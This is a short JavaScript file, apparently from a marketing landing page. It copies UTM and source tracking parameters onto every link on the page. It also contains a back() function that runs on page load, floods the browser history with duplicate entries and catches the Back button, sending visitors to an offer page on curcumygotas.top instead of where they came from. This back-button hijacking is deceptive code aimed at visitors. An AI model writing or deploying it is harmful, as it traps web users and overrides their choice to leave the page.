function setParameter() {

  var params = getParams();
  var links = document.getElementsByTagName('a');

  for (var i = 0, n = links.length; i < n; i++) {
    
    if (links[i].href.indexOf('#')>0) 
      continue;

    if (links[i].href.indexOf('?')>0) {
      var href = links[i].href.trim() + params;
    }
    else {
      var href = links[i].href.trim() + "?" + params.substr(1);
    }
    links[i].href = href
  }
}

function getParams(){
  
  const qry = window.location.search;
  const param = new URLSearchParams(qry);

  var src = param.get('src');
  var utm_source = param.get('utm_source');
  var utm_campaign = param.get('utm_campaign');
  var utm_medium = param.get('utm_medium');
  var utm_content = param.get('utm_content');

  return  (src == null ? '' : '&src=' + src) +
          (utm_source == null ? '' : '&utm_source=' + utm_source) +
          (utm_campaign == null ? '' : '&utm_campaign=' + utm_campaign) +
          (utm_medium == null ? '' : '&utm_medium=' + utm_medium) +
          (utm_content == null ? '' : '&utm_content=' + utm_content);
  
}

function back(link){
  setTimeout(() => {
    history.pushState({}, "", location.href);
    history.pushState({}, "", location.href);
    window.onpopstate = function(event) {
      console.log(event);
      console.log(event.currentTarget.location.href.indexOf('#'));
      console.log(event.state);
      if (event.state!=null) {
        location.href = link;
      }
    };
  }, 1000);
}

window.addEventListener('load', function (event) {
  setParameter();
  var href = getParams();
  back("https://curcumygotas.top/offer/?" + href.substr(1));
});
